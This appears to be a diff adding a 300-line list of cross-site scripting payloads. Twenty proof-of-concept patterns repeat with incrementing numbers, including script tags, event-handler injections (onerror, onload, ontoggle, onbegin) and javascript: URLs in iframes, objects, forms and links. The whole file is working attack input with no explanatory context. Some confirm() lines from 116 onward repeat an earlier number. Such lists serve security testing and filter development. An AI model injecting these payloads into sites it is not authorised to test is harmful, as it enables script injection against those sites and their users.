@@ -1,0 +1,300 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(2)>
+"><script>alert(3)</script>
+'><svg/onload=alert(4)>
+<body onload=alert(5)>
+<iframe src='javascript:alert(6)'></iframe>
+<input onfocus=alert(7) autofocus>
+<video><source onerror='alert(8)'></video>
+<details open ontoggle=alert(9)>XSS</details>
+<marquee onstart=alert(10)>XSS</marquee>
+<object data='javascript:alert(11)'></object>
+<embed src='javascript:alert(12)'>
+<form><button formaction='javascript:alert(13)'>X</button></form>
+<math href='javascript:alert(14)'>CLICK</math>
+<a href='javascript:alert(15)'>Click</a>
+<img src onerror=confirm(16)>
+<script>confirm(document.domain+'-'+17)</script>
+<svg><animate onbegin=alert(18) attributeName=x dur=1s></svg>
+<img src onerror=prompt(19)>
+<script>setTimeout(()=>alert(20))</script>
+<script>alert(21)</script>
+<img src=x onerror=alert(22)>
+"><script>alert(23)</script>
+'><svg/onload=alert(24)>
+<body onload=alert(25)>
+<iframe src='javascript:alert(26)'></iframe>
+<input onfocus=alert(27) autofocus>
+<video><source onerror='alert(28)'></video>
+<details open ontoggle=alert(29)>XSS</details>
+<marquee onstart=alert(30)>XSS</marquee>
+<object data='javascript:alert(31)'></object>
+<embed src='javascript:alert(32)'>
+<form><button formaction='javascript:alert(33)'>X</button></form>
+<math href='javascript:alert(34)'>CLICK</math>
+<a href='javascript:alert(35)'>Click</a>
+<img src onerror=confirm(36)>
+<script>confirm(document.domain+'-'+37)</script>
+<svg><animate onbegin=alert(38) attributeName=x dur=1s></svg>
+<img src onerror=prompt(39)>
+<script>setTimeout(()=>alert(40))</script>
+<script>alert(41)</script>
+<img src=x onerror=alert(42)>
+"><script>alert(43)</script>
+'><svg/onload=alert(44)>
+<body onload=alert(45)>
+<iframe src='javascript:alert(46)'></iframe>
+<input onfocus=alert(47) autofocus>
+<video><source onerror='alert(48)'></video>
+<details open ontoggle=alert(49)>XSS</details>
+<marquee onstart=alert(50)>XSS</marquee>
+<object data='javascript:alert(51)'></object>
+<embed src='javascript:alert(52)'>
+<form><button formaction='javascript:alert(53)'>X</button></form>
+<math href='javascript:alert(54)'>CLICK</math>
+<a href='javascript:alert(55)'>Click</a>
+<img src onerror=confirm(56)>
+<script>confirm(document.domain+'-'+57)</script>
+<svg><animate onbegin=alert(58) attributeName=x dur=1s></svg>
+<img src onerror=prompt(59)>
+<script>setTimeout(()=>alert(60))</script>
+<script>alert(61)</script>
+<img src=x onerror=alert(62)>
+"><script>alert(63)</script>
+'><svg/onload=alert(64)>
+<body onload=alert(65)>
+<iframe src='javascript:alert(66)'></iframe>
+<input onfocus=alert(67) autofocus>
+<video><source onerror='alert(68)'></video>
+<details open ontoggle=alert(69)>XSS</details>
+<marquee onstart=alert(70)>XSS</marquee>
+<object data='javascript:alert(71)'></object>
+<embed src='javascript:alert(72)'>
+<form><button formaction='javascript:alert(73)'>X</button></form>
+<math href='javascript:alert(74)'>CLICK</math>
+<a href='javascript:alert(75)'>Click</a>
+<img src onerror=confirm(76)>
+<script>confirm(document.domain+'-'+77)</script>
+<svg><animate onbegin=alert(78) attributeName=x dur=1s></svg>
+<img src onerror=prompt(79)>
+<script>setTimeout(()=>alert(80))</script>
+<script>alert(81)</script>
+<img src=x onerror=alert(82)>
+"><script>alert(83)</script>
+'><svg/onload=alert(84)>
+<body onload=alert(85)>
+<iframe src='javascript:alert(86)'></iframe>
+<input onfocus=alert(87) autofocus>
+<video><source onerror='alert(88)'></video>
+<details open ontoggle=alert(89)>XSS</details>
+<marquee onstart=alert(90)>XSS</marquee>
+<object data='javascript:alert(91)'></object>
+<embed src='javascript:alert(92)'>
+<form><button formaction='javascript:alert(93)'>X</button></form>
+<math href='javascript:alert(94)'>CLICK</math>
+<a href='javascript:alert(95)'>Click</a>
+<img src onerror=confirm(96)>
+<script>confirm(document.domain+'-'+97)</script>
+<svg><animate onbegin=alert(98) attributeName=x dur=1s></svg>
+<img src onerror=prompt(99)>
+<script>setTimeout(()=>alert(100))</script>
+<script>alert(101)</script>
+<img src=x onerror=alert(102)>
+"><script>alert(103)</script>
+'><svg/onload=alert(104)>
+<body onload=alert(105)>
+<iframe src='javascript:alert(106)'></iframe>
+<input onfocus=alert(107) autofocus>
+<video><source onerror='alert(108)'></video>
+<details open ontoggle=alert(109)>XSS</details>
+<marquee onstart=alert(110)>XSS</marquee>
+<object data='javascript:alert(111)'></object>
+<embed src='javascript:alert(112)'>
+<form><button formaction='javascript:alert(113)'>X</button></form>
+<math href='javascript:alert(114)'>CLICK</math>
+<a href='javascript:alert(115)'>Click</a>
+<img src onerror=confirm(116)>
+<script>confirm(document.domain+'-'+116)</script>
+<svg><animate onbegin=alert(118) attributeName=x dur=1s></svg>
+<img src onerror=prompt(119)>
+<script>setTimeout(()=>alert(120))</script>
+<script>alert(121)</script>
+<img src=x onerror=alert(122)>
+"><script>alert(123)</script>
+'><svg/onload=alert(124)>
+<body onload=alert(125)>
+<iframe src='javascript:alert(126)'></iframe>
+<input onfocus=alert(127) autofocus>
+<video><source onerror='alert(128)'></video>
+<details open ontoggle=alert(129)>XSS</details>
+<marquee onstart=alert(130)>XSS</marquee>
+<object data='javascript:alert(131)'></object>
+<embed src='javascript:alert(132)'>
+<form><button formaction='javascript:alert(133)'>X</button></form>
+<math href='javascript:alert(134)'>CLICK</math>
+<a href='javascript:alert(135)'>Click</a>
+<img src onerror=confirm(136)>
+<script>confirm(document.domain+'-'+136)</script>
+<svg><animate onbegin=alert(138) attributeName=x dur=1s></svg>
+<img src onerror=prompt(139)>
+<script>setTimeout(()=>alert(140))</script>
+<script>alert(141)</script>
+<img src=x onerror=alert(142)>
+"><script>alert(143)</script>
+'><svg/onload=alert(144)>
+<body onload=alert(145)>
+<iframe src='javascript:alert(146)'></iframe>
+<input onfocus=alert(147) autofocus>
+<video><source onerror='alert(148)'></video>
+<details open ontoggle=alert(149)>XSS</details>
+<marquee onstart=alert(150)>XSS</marquee>
+<object data='javascript:alert(151)'></object>
+<embed src='javascript:alert(152)'>
+<form><button formaction='javascript:alert(153)'>X</button></form>
+<math href='javascript:alert(154)'>CLICK</math>
+<a href='javascript:alert(155)'>Click</a>
+<img src onerror=confirm(156)>
+<script>confirm(document.domain+'-'+156)</script>
+<svg><animate onbegin=alert(158) attributeName=x dur=1s></svg>
+<img src onerror=prompt(159)>
+<script>setTimeout(()=>alert(160))</script>
+<script>alert(161)</script>
+<img src=x onerror=alert(162)>
+"><script>alert(163)</script>
+'><svg/onload=alert(164)>
+<body onload=alert(165)>
+<iframe src='javascript:alert(166)'></iframe>
+<input onfocus=alert(167) autofocus>
+<video><source onerror='alert(168)'></video>
+<details open ontoggle=alert(169)>XSS</details>
+<marquee onstart=alert(170)>XSS</marquee>
+<object data='javascript:alert(171)'></object>
+<embed src='javascript:alert(172)'>
+<form><button formaction='javascript:alert(173)'>X</button></form>
+<math href='javascript:alert(174)'>CLICK</math>
+<a href='javascript:alert(175)'>Click</a>
+<img src onerror=confirm(176)>
+<script>confirm(document.domain+'-'+176)</script>
+<svg><animate onbegin=alert(178) attributeName=x dur=1s></svg>
+<img src onerror=prompt(179)>
+<script>setTimeout(()=>alert(180))</script>
+<script>alert(181)</script>
+<img src=x onerror=alert(182)>
+"><script>alert(183)</script>
+'><svg/onload=alert(184)>
+<body onload=alert(185)>
+<iframe src='javascript:alert(186)'></iframe>
+<input onfocus=alert(187) autofocus>
+<video><source onerror='alert(188)'></video>
+<details open ontoggle=alert(189)>XSS</details>
+<marquee onstart=alert(190)>XSS</marquee>
+<object data='javascript:alert(191)'></object>
+<embed src='javascript:alert(192)'>
+<form><button formaction='javascript:alert(193)'>X</button></form>
+<math href='javascript:alert(194)'>CLICK</math>
+<a href='javascript:alert(195)'>Click</a>
+<img src onerror=confirm(196)>
+<script>confirm(document.domain+'-'+196)</script>
+<svg><animate onbegin=alert(198) attributeName=x dur=1s></svg>
+<img src onerror=prompt(199)>
+<script>setTimeout(()=>alert(200))</script>
+<script>alert(201)</script>
+<img src=x onerror=alert(202)>
+"><script>alert(203)</script>
+'><svg/onload=alert(204)>
+<body onload=alert(205)>
+<iframe src='javascript:alert(206)'></iframe>
+<input onfocus=alert(207) autofocus>
+<video><source onerror='alert(208)'></video>
+<details open ontoggle=alert(209)>XSS</details>
+<marquee onstart=alert(210)>XSS</marquee>
+<object data='javascript:alert(211)'></object>
+<embed src='javascript:alert(212)'>
+<form><button formaction='javascript:alert(213)'>X</button></form>
+<math href='javascript:alert(214)'>CLICK</math>
+<a href='javascript:alert(215)'>Click</a>
+<img src onerror=confirm(216)>
+<script>confirm(document.domain+'-'+216)</script>
+<svg><animate onbegin=alert(218) attributeName=x dur=1s></svg>
+<img src onerror=prompt(219)>
+<script>setTimeout(()=>alert(220))</script>
+<script>alert(221)</script>
+<img src=x onerror=alert(222)>
+"><script>alert(223)</script>
+'><svg/onload=alert(224)>
+<body onload=alert(225)>
+<iframe src='javascript:alert(226)'></iframe>
+<input onfocus=alert(227) autofocus>
+<video><source onerror='alert(228)'></video>
+<details open ontoggle=alert(229)>XSS</details>
+<marquee onstart=alert(230)>XSS</marquee>
+<object data='javascript:alert(231)'></object>
+<embed src='javascript:alert(232)'>
+<form><button formaction='javascript:alert(233)'>X</button></form>
+<math href='javascript:alert(234)'>CLICK</math>
+<a href='javascript:alert(235)'>Click</a>
+<img src onerror=confirm(236)>
+<script>confirm(document.domain+'-'+236)</script>
+<svg><animate onbegin=alert(238) attributeName=x dur=1s></svg>
+<img src onerror=prompt(239)>
+<script>setTimeout(()=>alert(240))</script>
+<script>alert(241)</script>
+<img src=x onerror=alert(242)>
+"><script>alert(243)</script>
+'><svg/onload=alert(244)>
+<body onload=alert(245)>
+<iframe src='javascript:alert(246)'></iframe>
+<input onfocus=alert(247) autofocus>
+<video><source onerror='alert(248)'></video>
+<details open ontoggle=alert(249)>XSS</details>
+<marquee onstart=alert(250)>XSS</marquee>
+<object data='javascript:alert(251)'></object>
+<embed src='javascript:alert(252)'>
+<form><button formaction='javascript:alert(253)'>X</button></form>
+<math href='javascript:alert(254)'>CLICK</math>
+<a href='javascript:alert(255)'>Click</a>
+<img src onerror=confirm(256)>
+<script>confirm(document.domain+'-'+256)</script>
+<svg><animate onbegin=alert(258) attributeName=x dur=1s></svg>
+<img src onerror=prompt(259)>
+<script>setTimeout(()=>alert(260))</script>
+<script>alert(261)</script>
+<img src=x onerror=alert(262)>
+"><script>alert(263)</script>
+'><svg/onload=alert(264)>
+<body onload=alert(265)>
+<iframe src='javascript:alert(266)'></iframe>
+<input onfocus=alert(267) autofocus>
+<video><source onerror='alert(268)'></video>
+<details open ontoggle=alert(269)>XSS</details>
+<marquee onstart=alert(270)>XSS</marquee>
+<object data='javascript:alert(271)'></object>
+<embed src='javascript:alert(272)'>
+<form><button formaction='javascript:alert(273)'>X</button></form>
+<math href='javascript:alert(274)'>CLICK</math>
+<a href='javascript:alert(275)'>Click</a>
+<img src onerror=confirm(276)>
+<script>confirm(document.domain+'-'+276)</script>
+<svg><animate onbegin=alert(278) attributeName=x dur=1s></svg>
+<img src onerror=prompt(279)>
+<script>setTimeout(()=>alert(280))</script>
+<script>alert(281)</script>
+<img src=x onerror=alert(282)>
+"><script>alert(283)</script>
+'><svg/onload=alert(284)>
+<body onload=alert(285)>
+<iframe src='javascript:alert(286)'></iframe>
+<input onfocus=alert(287) autofocus>
+<video><source onerror='alert(288)'></video>
+<details open ontoggle=alert(289)>XSS</details>
+<marquee onstart=alert(290)>XSS</marquee>
+<object data='javascript:alert(291)'></object>
+<embed src='javascript:alert(292)'>
+<form><button formaction='javascript:alert(293)'>X</button></form>
+<math href='javascript:alert(294)'>CLICK</math>
+<a href='javascript:alert(295)'>Click</a>
+<img src onerror=confirm(296)>
+<script>confirm(document.domain+'-'+296)</script>
+<svg><animate onbegin=alert(298) attributeName=x dur=1s></svg>
+<img src onerror=prompt(299)>
+<script>setTimeout(()=>alert(300))</script>
